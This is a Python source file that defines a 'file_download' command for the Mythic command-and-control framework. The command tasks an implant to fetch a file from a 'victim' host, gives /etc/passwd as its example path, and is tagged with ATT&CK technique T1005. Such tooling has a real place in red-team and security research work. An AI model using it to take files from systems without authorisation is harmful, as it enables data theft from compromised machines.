from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class FileDownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="path",
                display_name="File Path",
                type=ParameterType.String,
                description="Full path of file to download (e.g. /etc/passwd)",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            try:
                self.load_args_from_json_string(self.command_line)
            except Exception:
                # Accept plain path typed directly
                self.add_arg("path", self.command_line.strip())



class FileDownloadCommand(CommandBase):
    cmd            = "file_download"
    needs_admin    = False
    help_cmd       = "file_download /path/to/file"
    description    = (
        "Download a file from the victim via native host. Returns as attachment."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = FileDownloadArguments
    attackmapping  = ["T1005"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = task.args.get_arg("path") or ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
